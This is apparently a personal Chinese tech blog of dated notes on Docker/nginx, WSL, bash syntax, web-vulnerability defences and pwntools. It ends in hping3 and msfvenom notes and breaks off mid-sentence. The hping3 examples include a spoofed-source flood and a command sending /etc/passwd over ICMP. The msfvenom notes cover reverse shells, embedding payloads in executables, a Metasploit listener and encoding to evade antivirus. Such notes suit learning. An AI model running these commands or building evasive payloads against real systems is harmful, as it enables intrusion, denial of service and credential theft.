<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 先部署nginx进行代理</span><br><span class="line">docker run \</span><br><span class="line">-d --name proxy \</span><br><span class="line">-p 80:80 \</span><br><span class="line">--mount type=bind,source=/root/proxy/nginx,target=/etc/nginx/conf.d nginx</span><br><span class="line"> </span><br><span class="line"># 第一个项目</span><br><span class="line">docker run \</span><br><span class="line">-p 8080:80 \</span><br><span class="line">-d --name demo1 \</span><br><span class="line">--mount type=bind,source=/root/demo/dist,target=/usr/share/nginx/html nginx</span><br><span class="line"> </span><br><span class="line"># 第二个项目</span><br><span class="line">docker run \</span><br><span class="line">-p 8081:80 \</span><br><span class="line">-d --name demo2 \</span><br><span class="line">--mount type=bind,source=/root/demo/dist,target=/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure>
<p>其中proxy/nginx/default.conf文件的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  &lt;domain1&gt;; </span><br><span class="line">    # domain1 应该替换为要代理的域名 eg:www.test1.cn</span><br><span class="line">    # domain2 同理</span><br><span class="line">    location / &#123;</span><br><span class="line">    proxy_pass http://&lt;docker0 inet&gt;:8081;</span><br><span class="line"> # 此处的docker0 inet为docker的网桥</span><br><span class="line"> # 可以通过 ifconfig 查看，或者 netstat -rn</span><br><span class="line"> # 例如:172.17.0.1(需自己调整)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  &lt;domain2&gt;; </span><br><span class="line">    location / &#123;</span><br><span class="line">    proxy_pass http://&lt;docker0 inet&gt;:8080;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单解释一下就是，先运行一个nginx容器，负责监听80端口的请求，并按规则转发，然后再分别运行需要代理的服务(不一定是nginx的项目)，其中的<docker0 inet>在很多教程中说是要使用服务器的ip地址，这其实只在nginx安装在了宿主机上的时候有效。在将nginx也容器化之后就需要改为docker 的网桥。</p>
<p>值得注意的是，在每次修改nginx的配置文件之后都必须通过 <code>nginx -s reload</code> 使其生效 。同样的，在容器化之后也必须进入相应的容器执行这一命令，具体为<code>docker exec -it &lt;container_id&gt; bash</code>进入相应的容器，然后再执行<code>nginx -s reload</code>。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果我们只希望部署一个项目，那么可以使用如下方式，通过挂载项目目录和配置文件的方式来部署nginx项目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-d --name demo \</span><br><span class="line">--mount type=bind,source=/root/demo/nginx,target=/etc/nginx/conf.d \</span><br><span class="line">--mount type=bind,source=/root/demo/dist,target=/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure>
<h1 id="2023-08-11"><a href="#2023-08-11" class="headerlink" title="2023-08-11"></a>2023-08-11</h1><h2 id="window-如何完整的卸载-wsl-ubutun"><a href="#window-如何完整的卸载-wsl-ubutun" class="headerlink" title="window 如何完整的卸载 wsl ubutun"></a>window 如何完整的卸载 wsl ubutun</h2><p>以下是将 WSL Ubuntu 完全卸载的步骤：</p>
<ol>
<li><p>首先，打开 Powershell 或者命令提示符。</p>
</li>
<li><p>运行以下命令以查看您拥有的所有发行版本：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wsl -l -v</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>找到 Ubuntu 的发行版本名称，并运行以下命令来停止该发行版本：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --terminate &lt;Ubuntu 发行版名称&gt;</span><br></pre></td></tr></table></figure></li>
<li>运行以下命令，以确保 Ubuntu 的启动目录和状态都已被删除：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister &lt;Ubuntu 发行版名称&gt;</span><br></pre></td></tr></table></figure></li>
<li>如果您希望将 Ubuntu 目录中的文件完全删除，请手动删除 WSL Ubuntu 安装的目录，默认情况下它位于以下路径：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;用户名&gt;\AppData\Local\Packages\</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>您可以从其中找到名为“CanonicalGroupLimited.UbuntuXX.XX”的文件夹。</p>
<p>注意：卸载 WSL 发行版不会影响与 WSL 相关的任何个人文件或数据。</p>
<h1 id="2023-08-10"><a href="#2023-08-10" class="headerlink" title="2023-08-10"></a>2023-08-10</h1><h2 id="shell-–-和"><a href="#shell-–-和" class="headerlink" title="shell – ()和{}"></a>shell – ()和{}</h2><ol>
<li>在 bash shell 中，$()是将括号内命令的执行结果赋值给变量：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$ ls</span><br><span class="line">a.sh  data.sh  results.txt</span><br><span class="line">#将命令 ls 赋值给变量 a</span><br><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$ a=$(ls)</span><br><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$ echo $a</span><br><span class="line">a.sh data.sh results.txt</span><br></pre></td></tr></table></figure>
<ol>
<li>是用来作变量替换。一般情况下，var 与 并没有啥不一样。但是用 {} 会比较精确的界定变量名称的范围：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$ A=B</span><br><span class="line">#目的想打印变量A，然后再加上一个B，结果返回无。</span><br><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$ echo $AB</span><br><span class="line">#此时，$&#123; &#125;可以较为精确的确定变量的范围</span><br><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$ echo $&#123;A&#125;B</span><br><span class="line">BB</span><br><span class="line">(base) zeng@zeng-X11DAi-N:~/workspace$</span><br></pre></td></tr></table></figure></li>
<li>${ } 的一些特殊功能：<br>假设我们定义了一个变量为：file=/dir1/dir2/dir3/my.file.txt<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$&#123;file#*/&#125;：拿掉第一条 / 及其左边的字符串：dir1/dir2/dir3/my.file.txt</span><br><span class="line">$&#123;file##*/&#125;：拿掉最后一条 / 及其左边的字符串：my.file.txt</span><br><span class="line">$&#123;file#*.&#125;：拿掉第一个 . 及其左边的字符串：file.txt</span><br><span class="line">$&#123;file##*.&#125;：拿掉最后一个 . 及其左边的字符串：txt</span><br><span class="line">$&#123;file%/*&#125;：拿掉最后条 / 及其右边的字符串：/dir1/dir2/dir3</span><br><span class="line">$&#123;file%%/*&#125;：拿掉第一条 / 及其右边的字符串：(空值)</span><br><span class="line">$&#123;file%.*&#125;：拿掉最后一个 . 及其右边的字符串：/dir1/dir2/dir3/my.file</span><br><span class="line">$&#123;file%%.*&#125;：拿掉第一个 . 及其右边的字符串：/dir1/dir2/dir3/my</span><br><span class="line"> </span><br><span class="line">记忆的方法为：</span><br><span class="line"># 是去掉左边(在鉴盘上 # 在 $ 之左边)</span><br><span class="line">% 是去掉右边(在鉴盘上 % 在 $ 之右边)</span><br><span class="line">单一符号是最小匹配﹔两个符号是最大匹配。</span><br><span class="line">$&#123;file#/&#125;（不加*号）表示只去掉最左边的/</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="2023-02-10"><a href="#2023-02-10" class="headerlink" title="2023-02-10"></a>2023-02-10</h1><h2 id="XSS、CSRF、SSRF联系-amp-区别，防御"><a href="#XSS、CSRF、SSRF联系-amp-区别，防御" class="headerlink" title="XSS、CSRF、SSRF联系&amp;区别，防御"></a>XSS、CSRF、SSRF联系&amp;区别，防御</h2><h3 id="联系和区别"><a href="#联系和区别" class="headerlink" title="联系和区别"></a>联系和区别</h3><h4 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h4><p>XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p>
<h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。</p>
<p>CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  </p>
<p>SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="xss修复方式"><a href="#xss修复方式" class="headerlink" title="xss修复方式"></a>xss修复方式</h4><p>对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码</p>
<p>a)HttpOnly属性        </p>
<pre><code>   为Cookie中的关键值设置httponly属性，众所周知，大部分XSS（跨站脚本攻击）的目的都是通过浏览器的同源策略，来获取用户Cookie，从而冒充用户登陆系统的。

   如果为Cookie中用于用户认证的关键值设置httponly属性，浏览器将会禁止js通过同源策略访问cookie中设有httponly属性的信息，因此以劫持用户认证cookie为目的XSS攻击将会失败。

    但很明显，只为cookie中的值设置Httponly是不够的，因为XSS攻击并不是只能获取用户COOKIE，它还可以窃取用户浏览器信息，模拟用户身份执行操作等等
</code></pre><p>b) 对输入和URL参数进行过滤(白名单和黑名单</p>
<p>c)对输出进行编码</p>
<p>在输出数据之前对潜在的威胁的字符进行编码、转义是防御XSS攻击十分有效的措施。如果使用好的话，理论上是可以防御住所有的XSS攻击的。对所有要动态输出到页面的内容，通通进行相关的编码和转义。当然转义是按照其输出的上下文环境来决定如何转义的。</p>
<ol>
<li><strong>作为body文本输出，作为html标签的属性输出</strong></li>
</ol>
<p>比如：<span><br>{username}”&gt;&lt;/c:out&gt;&lt;/p&gt;</p>
<input type=”text” value=”${username}” />

<p>此时的转义规则如下：</p>
<p>&lt; 转成 &lt;</p>
<blockquote>
<p>转成 &gt;</p>
</blockquote>
<p>&amp; 转成 &amp;</p>
<p>” 转成 &quot;</p>
<p>‘ 转成 &amp;#39</p>
<ol>
<li><strong>javascript事件</strong></li>
</ol>
<p>`<input type="button" onclick='go_to_url("${myUrl}");' />``</p>
<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
<p>\ 转成 \</p>
<p>/ 转成 \/</p>
<p>; 转成 ；(全角;)</p>
<ol>
<li><strong>URL属性</strong></li>
</ol>
<p>如果 <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;imt&gt;</code> 等标签的 src 和 href 属性值为动态内容，那么要确保这些url没有执行恶意连接。</p>
<p>确保：href 和 src 的值必须以 <code>http://</code>开头，白名单方式；不能有10进制和16进制编码字符</p>
<h4 id="cfrs修复方式"><a href="#cfrs修复方式" class="headerlink" title="cfrs修复方式"></a>cfrs修复方式</h4><p>筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p>
<p><strong>a)Referer头检测法</strong><br>Referer标识当前请求的来源页面，浏览器访问时除了自动带上Cookie还会自动带上Referer，所以服务端可以检测Referer头是否本网站页面来决定是否响应请求。</p>
<p>Referer是浏览器自动带上的，基于认为浏览器没有相关漏洞的前提下，我们可以认为攻击者是没法伪造Referer头的，也就是检测Referer头的方法是可靠的。</p>
<p>但该方式有时会不受认可，一是因为浏览器是可以设置禁止发送Referer头的，如果使用该方式那么禁止Referer头的浏览将无法正常使用，这可能会降低用户使用体验。二是因为由于移动端的崛起当下流行前后端分离app和web共用一套后端代码，但app是不会自动带Referer头的，如果使用该方式app端不好处理。</p>
<p><strong>b)token检测法</strong><br>token就是服务端返回给客户端类似sessionid那样一长串的类值（长是为了防暴力猜解）。csrf依赖于浏览器该问链接时自动对应网站的cookie带上，token不放cookie（一般form表单加个hidden属性的input标签来存放）csrf就没法获取token，这样我们就可以通过检测发送过来的数据包中是否有正确的token值来决定是否响应请求。</p>
<p>在讲清token防御的原理后，我们再来讲token的设计，因为token方式给人的感觉很复杂令人望而生畏。</p>
<p>我们首先明确一个问题，就是能够防止csrf攻击的token，并不需要每次请求都不一样，在用户登录后到退出前的这整个过程中的所有请求token完全可以是一样。因为（在基于没有其他漏洞会泄漏本次会话的token的设想下）黑客是无法获取用户的tokne，所以又何必每个请求都要生成一个新的token呢。（token每次请求都要不一样的想法是受防重放攻击的影响）只考滤防csrf不考滤防重放的情况下，token设计就简单多了。</p>
<p>使用sessionid作为token设计：在csrf中cookie是浏览器自己带上的，本质而言用户的sessionid并未丢失（也就是攻击者并不能知道sessionid是多少），基于此我们完全可以不用另传一个值只需直接将sessionid作为token即可（或者也可以做些运算比如取sessionid的某些值做个md5来做为token，意思都差不多）。判断代码类似 <code>if session[&quot;id&quot;] == $_POST[&quot;token&quot;]</code></p>
<p>与sessionid同时返回的token设计：在生成sessionid的同时生成一个token（服务端token可以存于session变量中）返回给客户端，客户端保存该token每次请求时都在form表单中提交该值。判断代码类似<code>if session[&quot;token&quot;] == $_POST[&quot;token&quot;]</code></p>
<h4 id="ssrf修复方式"><a href="#ssrf修复方式" class="headerlink" title="ssrf修复方式"></a>ssrf修复方式</h4><ol>
<li><p>限制协议为HTTP、HTTPS</p>
</li>
<li><p>不用限制302重定向</p>
</li>
<li><p>设置URL白名单或者限制内网IP</p>
</li>
</ol>
<h3 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h3><h4 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h4><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 CSRF是跨站请求伪造攻击，是由于没有在关键操作执行时进行是否由用户自愿发起的确认，模仿合法用户对服务器发起请求 。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<h4 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h4><p>CSRF是服务器端没有对用户提交的数据进行严格的把控，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。而SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
<p>CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
<h1 id="2023-08-07"><a href="#2023-08-07" class="headerlink" title="2023-08-07"></a>2023-08-07</h1><h2 id="pip2安装pwntools报错error-invalid-command-‘egg-info‘"><a href="#pip2安装pwntools报错error-invalid-command-‘egg-info‘" class="headerlink" title="pip2安装pwntools报错error: invalid command ‘egg_info‘"></a>pip2安装pwntools报错error: invalid command ‘egg_info‘</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ pip2 install pwntools</span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                </span><br><span class="line">Defaulting to user installation because normal site-packages is not writeable</span><br><span class="line">Collecting pwntools</span><br><span class="line">  Using cached pwntools-4.8.0-py2.py3-none-any.whl (11.7 MB)</span><br><span class="line">Collecting sortedcontainers</span><br><span class="line">  Downloading sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)</span><br><span class="line">Collecting python-dateutil</span><br><span class="line">  Downloading python_dateutil-2.8.2-py2.py3-none-any.whl (247 kB)</span><br><span class="line">     |████████████████████████████████| 247 kB 43 kB/s </span><br><span class="line">Collecting pysocks</span><br><span class="line">  Downloading PySocks-1.7.1-py27-none-any.whl (16 kB)</span><br><span class="line">Collecting intervaltree&gt;=3.0</span><br><span class="line">  Using cached intervaltree-3.1.0.tar.gz (32 kB)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解决办法：安装setuptools"><a href="#解决办法：安装setuptools" class="headerlink" title="解决办法：安装setuptools"></a>解决办法：安装setuptools</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install --upgrade pip setuptools</span><br></pre></td></tr></table></figure>
<h3 id="重新安装pwntools"><a href="#重新安装pwntools" class="headerlink" title="重新安装pwntools"></a>重新安装pwntools</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install pwntools</span><br><span class="line">#成功</span><br></pre></td></tr></table></figure>
<h2 id="Python2安装pip的方法"><a href="#Python2安装pip的方法" class="headerlink" title="Python2安装pip的方法"></a>Python2安装pip的方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">sudo apt-get install python-dev # for python2.x installs</span><br></pre></td></tr></table></figure>
<h1 id="2023-08-03"><a href="#2023-08-03" class="headerlink" title="2023-08-03"></a>2023-08-03</h1><h2 id="Bind-for-0-0-0-0-80-failed-port-is-already-allocated-解决方案"><a href="#Bind-for-0-0-0-0-80-failed-port-is-already-allocated-解决方案" class="headerlink" title="Bind for 0.0.0.0:80 failed: port is already allocated.解决方案"></a>Bind for 0.0.0.0:80 failed: port is already allocated.解决方案</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#查看进程，发现相关的容器并没有在运行，而 docker-proxy 却依然绑定着端口：</span><br><span class="line"></span><br><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line">#检查docker镜像</span><br><span class="line"></span><br><span class="line">$ ps -aux | grep -v grep | grep docker-proxy</span><br><span class="line"></span><br><span class="line">#查看被docker-proxy占用的端口</span><br><span class="line"></span><br><span class="line">#停止 doker 进程，删除所有容器，然后删除 local-kv.db 这个文件，再启动 docker 就可以了。</span><br><span class="line"></span><br><span class="line">$ sudo service docker stop</span><br><span class="line">$ docker rm $(docker ps -aq)</span><br><span class="line">$ sudo rm /var/lib/docker/network/files/local-kv.db</span><br><span class="line">$ sudo service docker start</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="2023-08-01"><a href="#2023-08-01" class="headerlink" title="2023-08-01"></a>2023-08-01</h1><h2 id="hping3命令-–-测试网络及主机的安全"><a href="#hping3命令-–-测试网络及主机的安全" class="headerlink" title="hping3命令 – 测试网络及主机的安全"></a>hping3命令 – 测试网络及主机的安全</h2><p>hping3命令是用于生成和解析TCPIP协议数据包的开源工具，也是安全审计、防火墙测试等工作的标配工具 。</p>
<p>目前最新版是hping3，支持使用tcl脚本自动化地调用其API。优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p>
<p>语法格式：hping3 [参数]</p>
<p>常用参数： -c 发送数据包的次数 -m 设置TCP序列数 -v 版本信息 -I 网卡接口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#参考实例</span><br><span class="line"></span><br><span class="line">#对目标端口扫描：</span><br><span class="line"></span><br><span class="line"> [root@linuxcool ~]# hping3 -I eth0 -S 192.168.10.1 -p 80 </span><br><span class="line"></span><br><span class="line">#测试目标防火墙：</span><br><span class="line"></span><br><span class="line"> [root@linuxcool ~]# hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 </span><br><span class="line"></span><br><span class="line">#在发送端使用签名打包的ICMP包发送文件：</span><br><span class="line"></span><br><span class="line"> [root@linuxcool ~]#hping3 192.168.1.108 --icmp -d 100 --sign signature --file /etc/passwd </span><br><span class="line"></span><br><span class="line">#很直观的看到TTL的变化：</span><br><span class="line"></span><br><span class="line"> [root@linuxcool ~]# hping3 -z 192.168.0.107 </span><br><span class="line"></span><br><span class="line">#使用随机地址伪装自己的地址：</span><br><span class="line"></span><br><span class="line"> [root@linuxcool ~]# hping3 --rand-source 192.168.0.107</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://www.linuxcool.com/hping3">https://www.linuxcool.com/hping3</a></p>
</blockquote>
<h1 id="2022-04-18"><a href="#2022-04-18" class="headerlink" title="2022-04-18"></a>2022-04-18</h1><h2 id="msfvenom-使用"><a href="#msfvenom-使用" class="headerlink" title="msfvenom 使用"></a>msfvenom 使用</h2><h3 id="木马连接方式"><a href="#木马连接方式" class="headerlink" title="木马连接方式"></a>木马连接方式</h3><ol>
<li><p>正向连接(bind)是我主动去连接别人机器上的某个端口,很显然,这样极易被对方防火墙拦掉</p>
</li>
<li><p>反向连接(reverse)是让别人机器上的某个端口上的流量主动连到我机器上的某个端口上,起码暂时对各类应用层防火墙的穿透效果还是蛮不错的</p>
</li>
</ol>
<h3 id="msfvenom-常用选项"><a href="#msfvenom-常用选项" class="headerlink" title="msfvenom 常用选项"></a>msfvenom 常用选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-l 列出所有可用的payload,编码器,空指令……</span><br><span class="line">-p 指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-f 指定payload输出的文件类型,–help-formats,可查看支持的所有输出格式</span><br><span class="line">-e 指定要使用那种编码器</span><br><span class="line">-i 指定编码的次数,如果使用编码器</span><br><span class="line">-b 指定坏字符,比如空字符截断问题,等等……</span><br><span class="line">-x 使用一个自定义可执行程序模板,并将payload嵌入其中</span><br><span class="line">-k 当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span><br><span class="line">-o 指定创建好的payload的存放位置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="使用msf创建监听器"><a href="#使用msf创建监听器" class="headerlink" title="使用msf创建监听器"></a>使用msf创建监听器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD &lt;Payload name&gt;</span><br><span class="line">set LHOST &lt;LHOST value&gt;</span><br><span class="line">set LPORT &lt;LPORT value&gt;</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
<h3 id="创建Metasploit-payload"><a href="#创建Metasploit-payload" class="headerlink" title="创建Metasploit payload"></a>创建Metasploit payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">直接使用msfvenom生成的反弹shell程序一般都会被杀毒软件无情差杀掉</span><br><span class="line">避免被查杀的最普遍方法是编码，简单来说就是改变可执行文件中的代码形状，从而让只识别静态特征码的杀毒软件无法识别，且当木马运行之后，木马会将原始程序解码到内存中，如此木马原来的功能自然也不会受到影响</span><br><span class="line"></span><br><span class="line">可以使用x86/shikata_ga_nai 